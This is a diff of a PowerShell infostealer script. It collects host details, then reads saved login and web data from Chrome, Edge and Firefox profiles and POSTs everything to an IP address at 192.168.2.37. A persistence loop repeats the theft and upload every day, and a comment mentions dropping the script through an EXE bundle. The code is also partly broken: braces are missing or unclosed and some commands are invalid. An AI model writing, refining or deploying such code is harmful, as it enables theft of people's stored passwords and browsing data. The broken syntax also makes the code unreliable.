@@ -1,132 +1,70 @@
-
 #everything is in a EXE bundle to build python to drop this script correctly.
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
 
 $var += Get-NetIPConfiguration;Get-ComputerInfo;whoami;Get-Date
 
 $var += Get-WinSystemLocale
 
-# if profiles exist try 1 - 10 if not pull data normally... (GOOGLE CHROME)
+$URI = "192.168.2.37:80"
 
-if (Test-Path -Path "Profile 7") {
-
-    $var += cat -Path "Profile 1\Web Data"
-
-    $var += cat -Path "Profile 2\Login Data"
-
-    $var += cat -Path "Profile 2\Web Data"
-
-    $var += cat -Path "Profile 3\Login Data"
-
-    $var += cat -Path "Profile 3\Web Data"
-
-    $var += cat -Path "Profile 4\Login Data"
-
-    $var += cat -Path "Profile 4 \Web Data"
-
-    $var += cat -Path "Profile 5\Login Data"
-
-    $var += cat -Path "Profile 5\Web Data"
-
-    $var += cat -Path "Profile 6\Login Data"
-
-    $var += cat -Path "Profile 6\Web Data"
-
-    $var += cat -Path "Profile 7\Login Data"
-
-    $var += cat -Path "Profile 7\Web Data"
-
-    $var += cat -Path "Profile 8\Login Data"
-
-    $var += cat -Path "Profile 8\Web Data"
-
-    $var += cat -Path "Profile 9\Login Data"
-
-    $var += cat -Path "Profile 9\Web Data"
-
-    $var += cat -Path "Profile 10\Login Data"
-
-    $var += cat -Path "Profile 10\Web Data"
-}else{
-    cd Default
-    
-    $var += Get-Content "Login Data"
-
-    $var += Get-Content "Web Data"
-}
-
-
-
-$var += if (Test-Path -Path "Profile 1") { 
-    "Profile 1 exists"
+if (Test-Path -Path "FireFox") { 
+    $var += FIREFOX EXISTS!
+    $FireFox = "True"
+    $var += cat -Path "Firefox/UserData/Default/Login Data"; $var += cat -Path "Firefox/User Data/Default/Web Data";$var += cat -Path "Firefox/User Data/Local State"
+    $var += cat -Path "Firefox/UserData/Profile1/Login Data"; $var += cat -Path "Firefox/UserData/Profile1/Default/Web Data"
+    $var += cat -Path "Firefox/UserData/Profile2/Login Data"; $var += cat -Path "Firefox/UserData/Profile2/Default/Web Data"
+    $var += cat -Path "Firefox/UserData/Profile3/Login Data"; $var += cat -Path "Firefox/UserData/Profile3/Default/Web Data"
+    $var += cat -Path "Firefox/UserData/Profile4/Login Data"; $var += cat -Path "Firefox/UserData/Profile4/Default/Web Data"
+    $var += cat -Path "Firefox/UserData/Profile6/Login Data"; $var += cat -Path "Firefox/UserData/Profile6/Default/Web Data"
+    $var += cat -Path "Firefox/UserData/Profile7/Login Data"; $var += cat -Path "Firefox/UserData/Profile7/Default/Web Data"
+    $var += cat -Path "Firefox/UserData/Profile8/Login Data"; $var += cat -Path "Firefox/UserData/Profile8/Default/Web Data"
+    $var += cat -Path "Firefox/UserData/Profile9/Login Data"; $var += cat -Path "Firefox/UserData/Profile9/Default/Web Data"
+    $var += cat -Path "Firefox/UserData/Profile10/Login Data"; $var += cat -Path "Firefox/UserData/Profile10/Default/Web Data"
 } else {
-    "Profile 1 does not exist"
+    $var += "FireFox does not exist"
 } 
 
-$var += if (Test-Path -Path "Profile 2") {
-    "Profile 2 exists"
+if (Test-Path -Path "Google") {
+    $var += GOOGLE EXISTS!
+    $Chrome = "True"
+    $var += cat -Path "Google/Chrome/User Data/Default/Login Data"; $var += cat -Path "Google/Chrome/User Data/Default/Web Data";$var += cat -Path "Google/Chrome/User Data/Local State"
+    $var += cat -Path "Google/Chrome/User Data/Profile1/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile1/Default/Web Data"
+    $var += cat -Path "Google/Chrome/User Data/Profile2/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile2/Default/Web Data"
+    $var += cat -Path "Google/Chrome/User Data/Profile3/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile3/Default/Web Data"
+    $var += cat -Path "Google/Chrome/User Data/Profile4/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile4/Default/Web Data"
+    $var += cat -Path "Google/Chrome/User Data/Profile6/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile6/Default/Web Data"
+    $var += cat -Path "Google/Chrome/User Data/Profile7/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile7/Default/Web Data"
+    $var += cat -Path "Google/Chrome/User Data/Profile8/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile8/Default/Web Data"
+    $var += cat -Path "Google/Chrome/User Data/Profile9/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile9/Default/Web Data"
+    $var += cat -Path "Google/Chrome/User Data/Profile10/Login Data"; $var += cat -Path "Google/Chrome/User Data/Profile10/Default/Web Data"
 } else {
-    "Profile 2 does not exist"
+    $var += "Chome does not exist"
+}  
+
+if (Test-Path -Path "Microsoft") 
+    $var += EDGE EXISTS!
+    $Edge = "True"
+    $var += cat -Path "Microsoft\Edge\User Data\Default\Login Data"; $var += cat -Path "Microsoft/Edge\User Data/Default\Web Data";$var += cat -Path "Microsoft\Edge\User Data\Default\Local State"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile1/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile1/Default/Web Data"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile2/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile2/Default/Web Data"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile3/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile3/Default/Web Data"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile4/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile4/Default/Web Data"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile6/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile6/Default/Web Data"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile7/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile7/Default/Web Data"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile8/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile8/Default/Web Data"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile9/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile9/Default/Web Data"
+    $var += cat -Path "Microsoft/Edge/User Data/Profile10/Login Data"; $var += cat -Path "Microsoft/Edge/User Data/Profile10/Default/Web Data"
+} else {
+    $var += "Edge does not exist"
 }
 
-$var += if (Test-Path -Path "Profile 3") {
-    "Profile 3 exists"
-} else {
-    "Profile 3 does not exist"
-}
-
-$var += if (Test-Path -Path "Profile 4") {
-    "Profile 4 exists"
-} else {
-    "Profile 4 does not exist"
-}
-
-$var += if (Test-Path -Path "Profile 5") {
-    "Profile 5 exists"
-} else {
-    "Profile 5 does not exist"
-}
-
-$var += if (Test-Path -Path "Profile 6") {
-    "Profile 6 exists"
-} else {
-    "Profile 6 does not exist"
-}
-
-$var += if (Test-Path -Path "Profile 7") {
-    "Profile 7 exists"
-} else {
-    "Profile 7 does not exist"
-}
-
-$var += if (Test-Path -Path "Profile 8") {
-    "Profile 8 exists"
-} else {
-    "Profile 8 does not exist"
-}
-
-$var += if (Test-Path -Path "Profile 9") {
-    "Profile 9 exists"
-} else {
-    "Profile 9 does not exist"
-}
-
-$var += if (Test-Path -Path "Profile 10") {
-    "Profile 10 exists"
-} else {
-    "Profile 10 does not exist"
-}
-
-start-sleep 4
-
-
+start-sleep 4 
 
 #start http post 
 
 #httpsend
 
-$Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
+$Response = Invoke-WebRequest -Method Post -URI $URI -body $var -UseBasicParsing
 
 #attempt to set per
 
@@ -152,11 +90,51 @@ start-sleep 86400
 
 while($true)
 { 
+    if($FireFox -eq $True) {
+        $var += cat -Path "Firefox/UserData/Default/Login Data"; $var += cat -Path "Firefox/User Data/Default/Web Data";$var += cat -Path "Firefox/User Data/Local State"
+        $varper += cat -Path "Firefox/UserData/Profile1/Login Data"; $varper += cat -Path "Firefox/UserData/Profile1/Default/Web Data"
+        $varper += cat -Path "Firefox/UserData/Profile2/Login Data"; $varper += cat -Path "Firefox/UserData/Profile2/Default/Web Data"
+        $varper += cat -Path "Firefox/UserData/Profile3/Login Data"; $varper += cat -Path "Firefox/UserData/Profile3/Default/Web Data"
+        $varper += cat -Path "Firefox/UserData/Profile4/Login Data"; $varper += cat -Path "Firefox/UserData/Profile4/Default/Web Data"
+        $varper += cat -Path "Firefox/UserData/Profile6/Login Data"; $varper += cat -Path "Firefox/UserData/Profile6/Default/Web Data"
+        $varper += cat -Path "Firefox/UserData/Profile7/Login Data"; $varper += cat -Path "Firefox/UserData/Profile7/Default/Web Data"
+        $varper += cat -Path "Firefox/UserData/Profile8/Login Data"; $varper += cat -Path "Firefox/UserData/Profile8/Default/Web Data"
+        $varper += cat -Path "Firefox/UserData/Profile9/Login Data"; $varper += cat -Path "Firefox/UserData/Profile9/Default/Web Data"
+        $varper += cat -Path "Firefox/UserData/Profile10/Login Data"; $varper += cat -Path "Firefox/UserData/Profile10/Default/Web Data"
+    } else {
+            print "null"
+    if($Chrome -eq $True) {
+        $var += cat -Path "Google/Chrome/User Data/Default/Login Data"; $var += cat -Path "Google/Chrome/User Data/Default/Web Data";$var += cat -Path "Google/Chrome/User Data/Local State"
+        $varper += cat -Path "Google/Chrome/User Data/Profile1/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile1/Default/Web Data"
+        $varper += cat -Path "Google/Chrome/User Data/Profile2/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile2/Default/Web Data"
+        $varper += cat -Path "Google/Chrome/User Data/Profile3/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile3/Default/Web Data"
+        $varper += cat -Path "Google/Chrome/User Data/Profile4/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile4/Default/Web Data"
+        $varper += cat -Path "Google/Chrome/User Data/Profile6/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile6/Default/Web Data"
+        $varper += cat -Path "Google/Chrome/User Data/Profile7/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile7/Default/Web Data"
+        $varper += cat -Path "Google/Chrome/User Data/Profile8/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile8/Default/Web Data"
+        $varper += cat -Path "Google/Chrome/User Data/Profile9/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile9/Default/Web Data"
+        $varper += cat -Path "Google/Chrome/User Data/Profile10/Login Data"; $varper += cat -Path "Google/Chrome/User Data/Profile10/Default/Web Data"
+    } else {
+            print "null"
+    if($Edge -eq $True) {
+        $varper += cat -Path "Microsoft\Edge\User Data\Default\Login Data"; $varper += cat -Path "Microsoft/Edge\User Data/Default\Web Data";$varper += cat -Path "Microsoft\Edge\User Data\Default\Local State"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile1/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile1/Default/Web Data"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile2/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile2/Default/Web Data"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile3/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile3/Default/Web Data"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile4/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile4/Default/Web Data"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile6/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile6/Default/Web Data"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile7/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile7/Default/Web Data"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile8/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile8/Default/Web Data"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile9/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile9/Default/Web Data"
+        $varper += cat -Path "Microsoft/Edge/User Data/Profile10/Login Data"; $varper += cat -Path "Microsoft/Edge/User Data/Profile10/Default/Web Data"
+    } else {
+            print "null"
+
     $varper += Get-ComputerInfo;whoami;Get-Date;ipconfig
     
     #http send
 
-    $Response = Invoke-WebRequest -Method Post -URI 192.168.2.37:80 -body $var -UseBasicParsing
+    $Response = Invoke-WebRequest -Method Post -URI $URI -body $varper -UseBasicParsing
 
     Start-Sleep -Seconds 86400
 }
